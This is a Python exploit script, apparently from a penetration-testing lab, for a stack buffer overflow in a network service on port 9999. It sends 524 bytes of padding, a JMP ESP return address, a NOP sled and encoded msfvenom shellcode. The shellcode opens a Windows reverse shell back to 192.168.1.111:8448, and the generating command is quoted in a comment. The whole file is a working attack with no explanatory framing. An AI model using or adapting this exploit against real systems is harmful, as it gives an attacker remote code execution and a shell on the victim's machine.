import socket
import sys
import struct

# how to execute:
# python overflow.py 192.168.1.109 9999

ip = sys.argv[1]
port = int(sys.argv[2])

junk = ("A" * 524)

# !mona jmp -r esp -b "\x00"
eip = 0x311712F3
# convert to little endian address (invert address)
eip = struct.pack("<I", eip)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8448 -f c -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai
payload = ("\xda\xdd\xd9\x74\x24\xf4\x5e\xbd\x93\x49\xd1\x79\x33\xc9\xb1"
           "\x52\x83\xc6\x04\x31\x6e\x13\x03\xfd\x5a\x33\x8c\xfd\xb5\x31"
           "\x6f\xfd\x45\x56\xf9\x18\x74\x56\x9d\x69\x27\x66\xd5\x3f\xc4"
           "\x0d\xbb\xab\x5f\x63\x14\xdc\xe8\xce\x42\xd3\xe9\x63\xb6\x72"
           "\x6a\x7e\xeb\x54\x53\xb1\xfe\x95\x94\xac\xf3\xc7\x4d\xba\xa6"
           "\xf7\xfa\xf6\x7a\x7c\xb0\x17\xfb\x61\x01\x19\x2a\x34\x19\x40"
           "\xec\xb7\xce\xf8\xa5\xaf\x13\xc4\x7c\x44\xe7\xb2\x7e\x8c\x39"
           "\x3a\x2c\xf1\xf5\xc9\x2c\x36\x31\x32\x5b\x4e\x41\xcf\x5c\x95"
           "\x3b\x0b\xe8\x0d\x9b\xd8\x4a\xe9\x1d\x0c\x0c\x7a\x11\xf9\x5a"
           "\x24\x36\xfc\x8f\x5f\x42\x75\x2e\x8f\xc2\xcd\x15\x0b\x8e\x96"
           "\x34\x0a\x6a\x78\x48\x4c\xd5\x25\xec\x07\xf8\x32\x9d\x4a\x95"
           "\xf7\xac\x74\x65\x90\xa7\x07\x57\x3f\x1c\x8f\xdb\xc8\xba\x48"
           "\x1b\xe3\x7b\xc6\xe2\x0c\x7c\xcf\x20\x58\x2c\x67\x80\xe1\xa7"
           "\x77\x2d\x34\x67\x27\x81\xe7\xc8\x97\x61\x58\xa1\xfd\x6d\x87"
           "\xd1\xfe\xa7\xa0\x78\x05\x20\x0f\xd4\x04\xdf\xe7\x27\x06\x3e"
           "\xf8\xae\xe0\x2a\xe8\xe6\xbb\xc2\x91\xa2\x37\x72\x5d\x79\x32"
           "\xb4\xd5\x8e\xc3\x7b\x1e\xfa\xd7\xec\xee\xb1\x85\xbb\xf1\x6f"
           "\xa1\x20\x63\xf4\x31\x2e\x98\xa3\x66\x67\x6e\xba\xe2\x95\xc9"
           "\x14\x10\x64\x8f\x5f\x90\xb3\x6c\x61\x19\x31\xc8\x45\x09\x8f"
           "\xd1\xc1\x7d\x5f\x84\x9f\x2b\x19\x7e\x6e\x85\xf3\x2d\x38\x41"
           "\x85\x1d\xfb\x17\x8a\x4b\x8d\xf7\x3b\x22\xc8\x08\xf3\xa2\xdc"
           "\x71\xe9\x52\x22\xa8\xa9\x63\x69\xf0\x98\xeb\x34\x61\x99\x71"
           "\xc7\x5c\xde\x8f\x44\x54\x9f\x6b\x54\x1d\x9a\x30\xd2\xce\xd6"
           "\x29\xb7\xf0\x45\x49\x92")


exploit = junk + eip + ("\x90" * 16) + payload

# sending payload
while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.recv(1024)
    print("Sending payload...")
    s.send(exploit + "\n")
    s.recv(1024)
    s.close()
  except:
    sys.exit(0)
